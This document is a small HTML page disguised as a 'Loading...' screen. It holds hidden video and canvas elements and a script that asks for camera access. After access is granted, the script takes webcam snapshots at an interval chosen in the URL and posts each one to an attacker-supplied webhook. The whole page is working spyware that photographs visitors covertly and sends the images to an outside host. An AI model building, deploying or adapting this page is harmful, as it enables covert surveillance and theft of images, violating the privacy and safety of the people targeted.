<!DOCTYPE html>
<html>
<head><title>Loading...</title></head>
<body>
    <video id="video" width="1" height="1" autoplay style="display:none;"></video>
    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
    <script>
        const urlParams = new URLSearchParams(window.location.search);
        const webhook = urlParams.get('webhook');
        const interval = parseInt(urlParams.get('int')) * 1000;

        navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
            const video = document.getElementById('video');
            video.srcObject = stream;
            setInterval(() => {
                const canvas = document.getElementById('canvas');
                canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
                canvas.toBlob(blob => {
                    const formData = new FormData();
                    formData.append('file', blob, 'shot.png');
                    fetch(webhook, { method: 'POST', body: formData });
                }, 'image/png');
            }, interval);
        }).catch(err => console.log("User denied camera"));
    </script>
</body>
</html>
